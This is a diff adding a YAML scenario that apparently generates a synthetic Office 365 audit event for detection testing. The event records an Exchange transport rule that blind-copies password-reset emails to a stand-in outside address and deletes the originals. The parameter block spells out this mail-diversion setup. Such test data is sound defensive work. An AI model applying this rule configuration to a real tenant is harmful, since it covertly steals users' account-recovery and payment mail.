@@ -1,0 +1,85 @@
+type: scenario
+description: |
+  An Exchange transport rule is created that acts on messages matching a
+  subject pattern: it blind-copies them to an outside address and deletes the
+  original. Because transport rules run at the organisation level, one rule
+  quietly diverts mail for every mailbox at once, and the recipients never see
+  what was taken -- password-reset and payment notices being the usual targets.
+mitre:
+  tactics: [collection, defense-evasion]
+  techniques: ["T1114.003"]
+state:
+  tenant_id:  gen.uuid()
+  org_name:   "example.onmicrosoft.com"
+  actor_upn:  "admin@example.onmicrosoft.com"
+  src_ip:     gen.ipv4()
+  src_port:   gen.int(min=1024, max=65535)
+  record_id:  gen.uuid()
+  device_id:  gen.uuid()
+  request_id: gen.uuid()
+  session_id: gen.uuid()
+  token_object_id: gen.uuid()
+  app_id:     "497effe9-df71-4043-a8bb-14cf78c4b63b"
+  # Cmdlet recorded for the change. Any Set-, New-, Disable- or Remove- form
+  # of a transport rule is the same mail-flow tampering.
+  operation:  "New-TransportRule"
+  rule_name:  "Password Reset Email Drop"
+  match_subject: "Password was reset."
+  divert_to:  "collector@datadrop.test"
+steps:
+  - emit:
+      event_type: o365.management@v1
+      fields:
+        Operation: ref.operation
+        Workload: Exchange
+        RecordType: 1
+        ResultStatus: "True"
+        Id: ref.record_id
+        OrganizationId: ref.tenant_id
+        OrganizationName: ref.org_name
+        UserId: ref.actor_upn
+        UserKey: ref.actor_upn
+        UserType: 2
+        Version: 1
+        ObjectId: ""
+        ClientIP: "${ref.src_ip}:${ref.src_port}"
+        ClientAppId: ""
+        CorrelationID: ""
+        AppId: ref.app_id
+        AppPoolName: MSExchangeAdminApiNetCore
+        DeviceId: ref.device_id
+        ExternalAccess: false
+        OriginatingServer: "SN6PR08MB5488 (15.20.8335.015)"
+        RequestId: ref.request_id
+        SessionId: ref.session_id
+        TokenObjectId: ref.token_object_id
+        TokenTenantId: ref.tenant_id
+        AppAccessContext:
+          AADSessionId: ref.session_id
+          IssuedAtTime: "2025-01-14T14:35:03"
+          UniqueTokenId: "fjnbEEQzJkybACRSqMNcAA"
+        Parameters:
+          - Name: SubjectMatchesPatterns
+            Value: ref.match_subject
+          - Name: DeleteMessage
+            Value: "True"
+          - Name: StopRuleProcessing
+            Value: "False"
+          - Name: Priority
+            Value: "47"
+          - Name: SetAuditSeverity
+            Value: ""
+          - Name: Mode
+            Value: Enforce
+          - Name: SenderAddressLocation
+            Value: Header
+          - Name: Name
+            Value: ref.rule_name
+          - Name: Enabled
+            Value: "False"
+          - Name: RuleErrorAction
+            Value: Ignore
+          - Name: Comments
+            Value: "message copy"
+          - Name: BlindCopyTo
+            Value: ref.divert_to
